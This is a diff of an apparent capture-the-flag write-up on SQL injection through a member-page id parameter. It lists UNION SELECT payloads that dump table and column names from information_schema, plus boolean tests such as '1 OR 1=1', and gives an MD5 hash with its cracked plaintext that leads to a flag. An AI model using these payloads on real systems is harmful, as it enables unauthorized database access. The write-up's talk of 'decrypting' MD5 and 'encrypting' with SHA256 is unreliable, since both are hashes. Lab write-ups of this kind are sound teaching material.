@@ -6,7 +6,7 @@ This document provides a comprehensive guide on identifying and exploiting SQL i
 
 ## Vulnerability Description
 
-SQL injection vulnerabilities occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application. This document details various types of SQL injection attacks, including table name disclosure, boolean-based SQL injection, column name disclosure, and data extraction, highlighting the potential for unauthorized access to or manipulation of database information.
+SQL injection vulnerabilities occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application. This document details various types of SQL injection attacks, including table name disclosure, column name disclosure, boolean-based SQL injection and data extraction, highlighting the potential for unauthorized access to or manipulation of database information.
 
 ## Exploitation
 
@@ -14,14 +14,17 @@ SQL injection vulnerabilities occur when an attacker is able to insert or "injec
 
 - **Payload**: `1 UNION SELECT null, table_name FROM information_schema.tables`
 - **Purpose**: This payload is used to list all tables within the database.
-- **Example URL**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit#
 
 ### Checking for Table Existence
 
 - **Payloads**:
 - `1 OR 1=1`: This payload is a basic test to change the query logic to always return true.
 - `1 OR EXISTS (SELECT * FROM users)`: This payload checks if the `users` table exists by attempting to select records from it.
-- **Example URL**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit#
+
+### Column Name Disclosure
+
+- **Payload**: `1 UNION SELECT table_name, column_name FROM information_schema.columns`
+- **Usefullness:** Common SQL query used in SQL injection attacks to retrieve column names in tables.
 
 ## Extracting Sensitive Data
 
@@ -31,16 +34,10 @@ SQL injection vulnerabilities occur when an attacker is able to insert or "injec
 
 ## Cryptographic Challenge
 
-- **Task**: Decrypt the `countersign` column values using MD5, convert the plaintext to lowercase, and then re-encrypt using SHA256.
-- **Outcome**: The decrypted and re-encrypted value becomes "FortyTwo".
-
-This document outlines the process of identifying and exploiting SQL injection vulnerabilities to discover database schema information and extract sensitive data. Additionally, it includes a cryptographic challenge that demonstrates the process of decrypting and re-encrypting data using different cryptographic algorithms.
-
-### Discovering Column Names
-
-- **Payload**: `1 UNION SELECT table_name, column_name FROM information_schema.columns`
-- **Purpose**: This payload is used to list all columns within the database tables.
-- **Example URL**: http://<ip_address>/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
+- **Challenge**: Decrypt an MD5 hash and then re-encrypt the plaintext using SHA256.
+- **MD5 Hash**: `5ff9d0165b4f92b14994e5c685cdce28`
+- **Decrypted Text**: "FortyTwo"
+- **Instructions**: Decrypt the given MD5 hash to plaintext, convert the plaintext to lowercase, and then encrypt it using SHA256 to reveal a flag.
 
 ## Prevention
 
